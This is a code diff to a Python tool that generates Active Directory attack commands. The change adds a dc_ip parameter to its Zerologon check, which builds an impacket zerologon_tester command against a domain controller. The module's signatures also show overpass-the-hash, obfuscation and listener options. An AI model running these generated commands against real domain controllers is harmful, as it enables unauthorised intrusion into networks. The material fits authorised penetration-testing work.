@@ -358,14 +358,16 @@ def _overpass_the_hash(domain: str, dc_host: str, username: str, password: str,
 
 def _zerologon_check(domain: str, dc_host: str, username: str, password: str,
                      hash_nt: str, outfile: str, obfuscate: bool,
-                     lhost: str, lport: int) -> ADAttackResult:
-    cmd = f"python3 /opt/impacket/examples/zerologon_tester.py {dc_host} DC_IP_ADDRESS"
+                     lhost: str, lport: int, dc_ip: str = "DC_IP_ADDRESS") -> ADAttackResult:
+    # dc_ip is passed via the optional `dc_ip` kwarg from the caller; defaults to a placeholder
+    # if the caller does not supply one (preserves prior behavior for legacy callers).
+    cmd = f"python3 /opt/impacket/examples/zerologon_tester.py {dc_host} {dc_ip}"
     return ADAttackResult(
         command=cmd,
         technique="zerologon_check",
         notes=(
-            "Linux/impacket tool. Install: pip install impacket. "
-            "Non-destructive check only — does NOT exploit. "
+            f"Linux/impacket tool. Install: pip install impacket. "
+            f"Non-destructive check only — does NOT exploit. dc_ip={dc_ip}. "
             "Exploitation changes DC machine account password; only run in lab or with "
             "explicit written permission and a recovery plan."
         ),
@@ -408,7 +410,12 @@ def generate_adattack(
     obfuscate: bool = True,
     lhost: str = "192.168.1.100",
     lport: int = 8080,
+    dc_ip: str | None = None,
 ) -> ADAttackResult:
     if technique not in _DISPATCH:
         raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
-    return _DISPATCH[technique](domain, dc_host, username, password, hash_nt, outfile, obfuscate, lhost, lport)
+    fn = _DISPATCH[technique]
+    # _zerologon_check accepts an optional dc_ip kwarg; pass it through when provided.
+    if technique == "zerologon_check":
+        return fn(domain, dc_host, username, password, hash_nt, outfile, obfuscate, lhost, lport, dc_ip=dc_ip or "DC_IP_ADDRESS")
+    return fn(domain, dc_host, username, password, hash_nt, outfile, obfuscate, lhost, lport)
